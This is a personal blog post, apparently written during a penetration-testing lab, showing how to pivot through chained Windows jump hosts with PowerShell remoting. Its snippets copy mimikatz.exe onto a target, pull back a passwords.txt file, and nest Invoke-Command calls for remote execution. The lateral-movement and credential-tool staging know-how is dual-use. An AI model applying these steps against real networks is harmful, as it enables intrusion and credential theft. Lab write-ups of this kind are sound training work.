---
layout: post
title: Powershell - Pivoting
---

I thought I'd share what I just stumbled upon while working on the [PACES](https://www.pentesteracademy.com/gcb) lab.  I'm not really a Windows user, but while doing this lab you are forced in some situation to make use of and learn more about tooling that is available to penetration testers.  What I found might not be news to anyone else, but once it worked I thought it was pretty cool.

For a specific section in the lab, you can only connect to the next machine in the chain by using winrm / PSConnect.  Each machine can't reach the machine before the previous machine.  Besides having to pivot through to get to the target to execute commands, I also had to chain it together to get files across.  

It took me a while to get something to work.  I first tried to use the `netsh` to setup port forwarding from one machine to the next, and continue until I got to the target.  My idea was to forward until I could reach port 5985 on the target.  Unfortunately because of the multiple firewalls setup, knowing which ports were open on each machine turned out to be more difficult than I initially anticipated.

After many hours of trying different things, I happen to come across a website that mentions using `Copy-Item` combined with a PSSession.  

### The code

The following can be used to copy files to and from a target if you only have winrm / PSConnect access.

```powershell
#setup credential object
$password = ConvertTo-SecureString "securepassword" -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential('username',$password)

#create a background powershell session to the target
$sess = New-PSSession -ComputerName dc.target.local -Credential $creds -Authentication Negotiate

#copy to the target
Copy-Item -Path C:\users\chris\Downloads\mimikatz.exe -Destination c:\users\username\desktop\ -ToSession $sess
#copy from the target
Copy-Item -Path c:\users\chris\Downloads\passwords.txt -Destination C:\users\chris\Downloads\ -FromSession $sess
```

### Put it into practice

For an example, let's look at the following diagram:  

![](/assets/2022-02-16-04-54-25.png)

The aim here is to upload a file to `target` and execute it.

A very dumbed down (credential creating/passing removed) pseudo example:

1.  Copy file to **jump1** by SMB
2.  Invoke-Command -ComputerName **jump1** -ScriptBlock {Copy file to **jump2**}
3.  Invoke-Command -ComputerName **jump1** -ScriptBlock {Invoke-Command -ComputerName **jump2** -ScriptBlock {Copy file to **jump3**}}
4.  Invoke-Command -ComputerName jump1 -ScriptBlock {Invoke-Command -ComputerName **jump2** -ScriptBlock {Invoke-Command -ComputerName **jump3** -ScriptBlock{Copy file to **target**}}}
5.  Invoke-Command -ComputerName **jump1** -ScriptBlock {Invoke-Command -ComputerName **jump2** -ScriptBlock {Invoke-Command -ComputerName **jump3** -ScriptBlock{ Invoke-Command -ComputerName **target** -ScriptBlock {run command}}}}

### Pivot and copy

Let's just look at the first copy section to get the file onto `jump2`:

```powershell
$jump1_password = ConvertTo-SecureString "securepassword" -AsPlainText -Force;
$jump1_creds = New-Object System.Management.Automation.PSCredential('username',$jump1_password);
$jump1_session = New-PSSession -ComputerName jump1 -Credential $jump1_creds -Authentication Negotiate;
Invoke-Command -Session $jump1_session -ScriptBlock {
  $jump2_password = ConvertTo-SecureString "securepassword" -AsPlainText -Force;
  $jump2_creds = New-Object System.Management.Automation.PSCredential('username',$jump2_password);
  $jump2_session = New-PSSession -ComputerName jump2 -Credential $jump2_creds -Authentication Negotiate;  
  Copy-Item -Path C:\users\chris\Downloads\mimikatz.exe -Destination c:\users\username\desktop\ -ToSession $jump2_session;
}
```

I have tried to lay out space out the commands a bit to make it more readable, but the aim of this is to have a one liner at the end.

### Improvements

This might not be the most elegant solution, but for my purposes it worked out great.  I'm happy to learn from anyone that has a different way of doing this.